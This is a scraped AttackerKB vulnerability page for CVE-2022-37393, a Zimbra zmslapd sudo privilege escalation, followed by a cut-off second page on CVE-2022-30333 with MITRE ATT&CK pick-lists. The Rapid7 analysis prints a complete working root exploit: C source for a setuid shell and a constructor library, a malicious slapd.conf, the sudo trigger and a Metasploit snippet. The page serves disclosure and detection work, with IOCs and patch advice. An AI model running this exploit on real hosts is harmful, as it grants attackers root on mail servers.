Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[exploit/linux/local/zimbra\_slapper\_priv\_esc](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb "exploit/linux/local/zimbra_slapper_priv_esc")

[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Authenticated](/search?q=post_auth&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

Zimbra’s sudo configuration permits the zimbra user to execute the zmslapd binary as root with arbitrary parameters. As part of its intended functionality, zmslapd can load a user-defined configuration file, which includes plugins in the form of .so files, which also execute as root.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)
* [![Rapid7](/static/public/img/rapid7-logo-light.svg)
  ![Rapid7](/static/public/img/rapid7-logo-dark.svg)
  Analysis](#rapid7-analysis)

## Add Assessment

[Log in to add an Assessment](/login)

1

[![](https://avatars.githubusercontent.com/u/104588115?v=4&s=50)](/contributors/rbowes-r7)

**[rbowes-r7 (95)](/contributors/rbowes-r7)**
![](/static/public/img/Badges-20-assessments.svg)

[August 23, 2022 4:47pm UTC (2 years ago)](/assessments/5176134d-eaa9-4d74-8d14-9bc1717057fe)•
Edited 2 years ago ▾

###### Ratings

* Attacker Value
  Very High
* Exploitability
  Low
[Gives privileged access](/search?q=high_privilege_access&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Authenticated](/search?q=post_auth&qt=tag)
###### Technical Analysis

This is a privilege-escalation vulnerability in Zimbra, to go from the `zimbra` user to `root`. As of writing, this has been publicly known for nearly a near, and reported to Zimbra for about a month.

Although it requires an account, there have been a whole pile of recent CVEs that get you there – [CVE-2022-30333](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis), [CVE-2022-27925](https://attackerkb.com/topics/dSu4KGZiFd/cve-2022-27925/rapid7-analysis), and [CVE-2022-27924](https://attackerkb.com/topics/6vZw1iqYRY/cve-2022-27924/rapid7-analysis)

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/5176134d-eaa9-4d74-8d14-9bc1717057fe)
[Delete Assessment and Exploited in the Wild Report](/assessments/5176134d-eaa9-4d74-8d14-9bc1717057fe)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-5176134d-eaa9-4d74-8d14-9bc1717057fe)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

7.8 High

Impact Score:

5.9

Exploitability Score:

1.8

Vector:

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Local

Attack Complexity (AC):

Low

Privileges Required (PR):

Low

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions

Unknown

Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module

Unknown

Reporter

Unknown

### Vendors

* zimbra

### Products

* collaboration 8.7.10,
* collaboration 8.7.11,
* collaboration 8.7.6,
* collaboration 8.7.7,
* collaboration 8.7.9,
* collaboration 8.8.0,
* collaboration 8.8.10,
* collaboration 8.8.11,
* collaboration 8.8.12,
* collaboration 8.8.15,
* collaboration 8.8.2,
* collaboration 8.8.3,
* collaboration 8.8.4,
* collaboration 8.8.6,
* collaboration 8.8.7,
* collaboration 8.8.8,
* collaboration 8.8.9,
* collaboration 9.0.0

### Metasploit Modules

[exploit/linux/local/zimbra\_slapper\_priv\_esc (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zimbra\_slapper\_priv\_esc.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb)

### Exploited in the Wild

Reported by:
![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)

[gwillcox-r7](/contributors/gwillcox-r7)
 indicated source as
 Government or Industry Alert  [(https://www.cisa.gov/known-exploited-vulnerabilities-catalog)](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)

[Reported: August 23, 2022 3:57am UTC (2 years ago)](#exploited-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

#### Would you like to delete this Exploited in the Wild Report?

[Yes, delete this report](#exploied-in-the-wild_b50031c2-b390-4cf9-bf6f-7a5fb8cf8677)

### References

##### Canonical

[CVE-2022-37393 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-37393)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-37393)
##### Miscellaneous

<https://github.com/rapid7/metasploit-framework/pull/16807><https://attackerkb.com/topics/92AeLOE1M1/cve-2022-37393/rapid7-analysis><https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7
[August 16, 2022 7:40pm UTC (2 years ago)](/topics/92AeLOE1M1/cve-2022-37393/rapid7-analysis)•
Last updated August 16, 2022 8:16pm UTC (2 years ago)

###### Technical Analysis

## Description

On October 27, 2021, Darren Martyn [posted](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/) an exploit for a privilege escalation vulnerability in Zimbra Collaboration Suite. Due to Zimbra’s [disclosure policy](https://wiki.zimbra.com/wiki/Zimbra_Responsible_Disclosure_Policy), which forbids publishing exploit code, he [opted not to report it to them](https://darrenmartyn.ie/2021/10/25/zimbra-nginx-local-root-exploit/).

If successfully exploited, a user with a shell account as the `zimbra` user (say, by exploiting CVE-2022-30333) can use CVE-2022-37393 to escalate to root privileges. As of this writing, all current versions of Zimbra are affected, including 9.0.0 P25 and 8.8.15 P32.

While this issue requires a local account on the Zimbra host, there have been three remote code execution vulnerabilities in Zimbra lately: [CVE-2022-30333](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis) (unrar), [CVE-2022-27924](https://attackerkb.com/topics/6vZw1iqYRY/cve-2022-27924/rapid7-analysis) (memcached injection), and [CVE-2022-27925](https://attackerkb.com/topics/dSu4KGZiFd/cve-2022-27925) (arbitrary file upload as the admin user). Additionally, Zimbra is [quite popular](https://www.shodan.io/search?query=%22Set-Cookie%3A+ZM_LOGIN_CSRF%3D%22+%22200+OK%22) (as of this writing, there are approximately 62,000 Internet-facing hosts from a quick Shodan query).

We ran across Darren Martyn’s blog post and exploit over the course of researching a separate Zimbra issue ([CVE-2022-30333](https://attackerkb.com/topics/RCa4EIZdbZ/cve-2022-30333/rapid7-analysis)), verified the privilege escalation works, and decided it was worth reporting. We reported it to Zimbra on July 21, 2022, and created [CVE-2022-37393](https://nvd.nist.gov/vuln/detail/CVE-2022-30333) to track it. We also published [a Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb) to help test the issue.

We are not aware of active exploitation of CVE-2022-37393 at this time, but it could be very difficult to detect successful exploitation because it grants root access.

## Technical analysis

We analyzed this vulnerability based on our research, combined with [Darren Martyn’s blog post](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/), which outlines the attack in detail.

The core of the issue is that the Zimbra user account has passwordless `sudo` access to a bunch of different executables:

```
zimbra@zimbra:~$ sudo -l
Matching Defaults entries for zimbra on zimbra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, !requiretty
User zimbra may run the following commands on zimbra:
    (root) NOPASSWD: /opt/zimbra/libexec/zmstat-fd *
    (root) NOPASSWD: /opt/zimbra/libexec/zmslapd
    (root) NOPASSWD: /opt/zimbra/common/sbin/postfix
    (root) NOPASSWD: /opt/zimbra/common/sbin/postalias
    (root) NOPASSWD: /opt/zimbra/common/sbin/qshape.pl
    (root) NOPASSWD: /opt/zimbra/common/sbin/postconf
    (root) NOPASSWD: /opt/zimbra/common/sbin/postsuper
    (root) NOPASSWD: /opt/zimbra/common/sbin/postcat
    (root) NOPASSWD: /opt/zimbra/libexec/zmqstat
    (root) NOPASSWD: /opt/zimbra/libexec/zmmtastatus
    (root) NOPASSWD: /opt/zimbra/common/sbin/amavis-mc
    (root) NOPASSWD: /opt/zimbra/common/sbin/nginx
    (root) NOPASSWD: /opt/zimbra/libexec/zmmailboxdmgr

```

CVE-2022-37393 specifically affects `zmslapd`, which is a shell script that

essentially runs `slapd` with a custom environment:

```
zimbra@zimbra:~$ cat /opt/zimbra/libexec/zmslapd
#!/bin/bash
[...]
ulimit -n 32768
ulimit -c unlimited
ulimit -v unlimited
export LD_PRELOAD=/opt/zimbra/common/lib/libtcmalloc_minimal.so
exec /opt/zimbra/common/libexec/slapd "$@"

```

`slapd` is a standalone LDAP daemon, which can run as an arbitrary user and group:

```
zimbra@zimbra:~$ man slapd
[...]
-u user
       slapd  will  run  slapd with the specified user name or id, and that user's supplementary group access list as set with initgroups(3).  The group ID is also changed to this user's gid, unless the -g
       option is used to override.  Note when used with -r, slapd will use the user database in the change root environment.
       Note that on some systems, running as a non-privileged user will prevent passwd back-ends from accessing the encrypted passwords.  Note also that any shell back-ends will run as the  specified  non-
       privileged user.
-g group
       slapd will run with the specified group name or id.  Note when used with -r, slapd will use the group database in the change root environment.

```

And can accept a configuration file:

```
-f slapd-config-file
       Specifies the slapd configuration file. The default is /opt/zimbra/common/etc/openldap/slapd.conf.

```

Which can contain plugins:

```
zimbra@zimbra:~$ cat /opt/zimbra/common/etc/openldap/slapd.conf
[...]
# Load dynamic backend modules:
# modulepath	/opt/zimbra/common/libexec/openldap
# moduleload	back_mdb.la
# moduleload	back_ldap.la

```

Darren demonstrated a very simple C program that spawns a shell (`rootslap.c`):

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}

```

And a shared module that will setuid that shell so it runs as root (`libhax.c`):

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/slapper/rootslap", 0, 0);
    chmod("/tmp/slapper/rootslap", 04755);
    printf("[+] done!\n");
}

```

And a configuration file for `slapd` (`slapd.conf`):

```
modulepath	/tmp/slapper
moduleload	libhax.so

```

You can automate all this with [his published proof of concept](https://github.com/darrenmartyn/zimbra-slapper/blob/main/slapper.sh), but to run it directly (note that we simplified some of their compilation commands):

```
zimbra@zimbra:/tmp$ gcc -shared -o /tmp/slapper/libhax.so ./libhax.c
[...]
zimbra@zimbra:/tmp$ gcc -o /tmp/slapper/rootslap ./rootslap.c
[...]
zimbra@zimbra:/tmp$ sudo /opt/zimbra/libexec/zmslapd -u root -g root -f ./slapd.conf
[+] done!
zimbra@zimbra:/tmp$ ls -l slapper/rootslap
-rwsr-xr-x 1 root root 8480 Jul 21 22:18 slapper/rootslap
zimbra@zimbra:/tmp$ slapper/rootslap
# whoami
root

```

We essentially implemented the same attack [in Metasploit](https://github.com/rapid7/metasploit-framework/pull/16807), except that we use a built-in payload:

```
config = "modulepath #{exploit_dir}\nmoduleload #{library_name}\n"
write_file(config_path, config)
write_file(library_path, generate_payload_dll)
cmd = "sudo #{datastore['ZIMBRA_BASE']}/libexec/zmslapd -u root -g root -f #{config_path}"
print_status "Attempting to trigger payload: #{cmd}"
cmd_exec(cmd)

```
## IOCs

Because Zimbra is installed on a standard Linux system, specific detection will depend on exactly how that host is configured. However, on the Ubuntu 18.04 machine that we used for testing, `/var/log/auth.log` reveals the attack very plainly:

```
ron@zimbra:/var/log$ cat auth.log | grep 'sudo.*slapd'
[...]
Jul 19 16:06:44 zimbra sudo:   zimbra : TTY=unknown ; PWD=/tmp/slapper ; USER=root ; COMMAND=/opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/slapper/slapd.conf
Jul 19 20:30:59 zimbra sudo:   zimbra : TTY=unknown ; PWD=/opt/zimbra ; USER=root ; COMMAND=/opt/zimbra/libexec/zmslapd -l LOCAL0 -u zimbra -h ldap://zimbra.example.org:389 ldapi:/// -F /opt/zimbra/data/ldap/config
Jul 21 19:44:30 zimbra sudo:   zimbra : TTY=unknown ; PWD=/opt/zimbra/log ; USER=root ; COMMAND=/opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.A3VaIcB/.psEGEYqz
Jul 21 19:44:48 zimbra sudo:   zimbra : TTY=unknown ; PWD=/opt/zimbra/log ; USER=root ; COMMAND=/opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.caYdb4i/.rxxxpPws0
Jul 21 19:45:01 zimbra sudo:   zimbra : TTY=unknown ; PWD=/opt/zimbra/log ; USER=root ; COMMAND=/opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.SbiD7D94BJ/.lVQpf
[...]

```
## Guidance

Customers should patch all Zimbra installations as quickly as possible to prevent other vulnerabilities from being exploited.

## References

* [CVE-2022-37393](https://nvd.nist.gov/vuln/detail/CVE-2022-30333)
* [Original disclosure](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/)
* [Original proof of concept](https://github.com/darrenmartyn/zimbra-slapper/)
* [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/zimbra_slapper_priv_esc.rb)
* [Metasploit PR](https://github.com/rapid7/metasploit-framework/pull/16807)

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/92AeLOE1M1/cve-2022-37393/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/92AeLOE1M1/cve-2022-37393/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from attackerkb.com_b4139d24_20250115_111911.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
##### Very High

4

### CVE-2022-30333

4

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Attacker Value
###### Very High

(1 user assessed)

![](/static/private/img/attacker-value/dark/attacker-value-3.svg)

Exploitability
###### Moderate

(1 user assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [None](/search?privilegesRequired=NONE)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

4

# CVE-2022-30333

Disclosure Date: May 09, 2022
•
(Last updated June 29, 2024) ▾

[CVE-2022-30333](/search?q=CVE-2022-30333)
CVSS v3 Base Score:
7.5

Exploited in the Wild

Reported by [gwillcox-r7](/contributors/gwillcox-r7)  [and 2 more...](#exploited-in-the-wild)

[View Source Details](#exploited-in-the-wild)

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

